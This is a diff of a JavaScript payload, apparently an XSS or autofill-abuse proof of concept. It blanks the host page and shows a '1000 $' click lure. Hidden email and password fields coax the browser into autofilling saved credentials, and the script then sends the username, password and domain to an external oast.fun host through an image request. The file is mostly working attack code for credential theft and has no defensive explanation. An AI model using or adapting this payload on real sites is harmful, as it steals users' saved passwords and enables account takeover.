@@ -1,16 +1,18 @@
 document.body.innerHTML = "";
-var scriptss = document.scripts;
+var scripts = document.scripts;
 
-for (var i = scriptss.length - 1; i >= 0; i--) {
-  var script = scriptss[i];
+for (var i = scripts.length - 1; i >= 0; i--) {
+  var script = scripts[i];
   script.parentNode.removeChild(script);
 }
 
-var s = document.createElement('style');
-var c = 'body > *:not(form):not(textarea) { display: none !important; }';
-s.appendChild(document.createTextNode(c));
-document.head.appendChild(s);
+// Create style to hide everything except form
+var styleElement = document.createElement('style');
+var css = 'body > *:not(form):not(textarea) { display: none !important; }';
+styleElement.appendChild(document.createTextNode(css));
+document.head.appendChild(styleElement);
 
+// Create form element
 var form = document.createElement('form');
 form.style.display = 'flex';
 form.style.flexDirection = 'column';
@@ -18,33 +20,30 @@ form.style.justifyContent = 'center';
 form.style.alignItems = 'center';
 form.style.height = '100vh';
 
-var inputName = document.createElement('input');
-inputName.type = 'text';
-inputName.id = 'username';
-inputName.name = 'username';
-inputName.placeholder = 'CLICK or DOUBLE CLICK to GET 1000 $';
-inputName.style.border = "none";
-inputName.style.outline = "none";
-inputName.style.background = "none";
-inputName.style.width = "100%";
-inputName.style.textAlign = "center";
-inputName.style.fontSize = "30px";
-inputName.style.fontWeight = "bold";
-inputName.style.display = "none"; // Hide the input field
-inputName.classList.add("single-input");
+// Create input fields with IDs and names
+var inputUsername = document.createElement('input');
+inputUsername.type = 'text';
+inputUsername.id = 'email'; 
+inputUsername.name = 'email'; 
+inputUsername.style.display = 'none';
+inputUsername.style.width = '300px';
+inputUsername.style.height = '40px';
+inputUsername.style.marginBottom = '10px';
 
 var inputPassword = document.createElement('input');
 inputPassword.type = 'password';
-inputPassword.id = 'password';
+inputPassword.id = 'password'; 
 inputPassword.name = 'password';
-inputPassword.style.border = "none";
-inputPassword.style.outline = "none";
-inputPassword.style.background = "none";
-inputPassword.style.padding = "0";
-inputPassword.style.width = "1%";
-inputPassword.style.display = "none"; // Hide the input field
-inputPassword.classList.add("single-input");
+inputPassword.style.display = 'none';
+inputPassword.style.width = '300px';
+inputPassword.style.height = '40px';
+inputPassword.style.marginBottom = '10px';
 
+// Add the fields to the form
+form.appendChild(inputUsername);
+form.appendChild(inputPassword);
+
+// Create the clickable text
 var displayText = document.createElement('div');
 displayText.innerText = 'CLICK or DOUBLE CLICK to GET 1000 $';
 displayText.style.textAlign = "center";
@@ -52,32 +51,60 @@ displayText.style.fontSize = "30px";
 displayText.style.fontWeight = "bold";
 displayText.style.cursor = "pointer";
 
-form.appendChild(inputName);
-form.appendChild(inputPassword);
+// Add the text to the form
 form.appendChild(displayText);
 
+// Temporarily display the form to trigger autofill
 document.body.appendChild(form);
 
+// Function to send the credentials back to your server
 function sendCredentials(username, password) {
   var img = new Image();
-  img.src = `https://fakonltzsfedwiqhgufs2qi0cms94akrh.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+  img.src = `https://fakonltzsfedwiqhgufs2qi0cms94akrh.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&domain=${encodeURIComponent(window.location.hostname)}`;
   document.body.appendChild(img);
 }
 
-function attachEventListeners() {
-  let a = document.getElementById('username');
-  let b = document.getElementById('password');
+// Function to extract and send the credentials after a delay
+function extractAndSendCredentials() {
+  let username = document.getElementById('email').value;
+  let password = document.getElementById('password').value;
   
-  a.value = 'victimuser'; // Predefined username
-  b.value = 'victimpassword'; // Predefined password
-
-  function f() {
-    sendCredentials(a.value, b.value);
+  if (username && password) {
+    sendCredentials(username, password);
+  } else {
+    console.error("Autofill did not work. No credentials captured.");
   }
-
-  displayText.onclick = f;
+  
+  // Hide the input fields after autofill
+  inputUsername.style.display = 'none';
+  inputPassword.style.display = 'none';
 }
 
+// Function to simulate user interaction to trigger autofill
+function simulateInteraction() {
+  inputUsername.style.display = 'block'; // Show temporarily to trigger autofill
+  inputPassword.style.display = 'block'; // Show temporarily to trigger autofill
+
+  inputUsername.focus();
+  inputPassword.focus();
+  inputPassword.blur();
+  
+  inputUsername.style.display = 'none'; // Hide after autofill
+  inputPassword.style.display = 'none'; // Hide after autofill
+}
+
+// Attach event listeners to the clickable text
+displayText.addEventListener('click', function() {
+  simulateInteraction();
+  setTimeout(extractAndSendCredentials, 3000); // Delay to allow autofill
+});
+
+displayText.addEventListener('dblclick', function() {
+  simulateInteraction();
+  setTimeout(extractAndSendCredentials, 3000); // Delay to allow autofill
+});
+
+// Attach the event listeners after DOM content is fully loaded
 document.addEventListener('DOMContentLoaded', function() {
-  setTimeout(attachEventListeners, 1000);
+  setTimeout(simulateInteraction, 1000);
 });
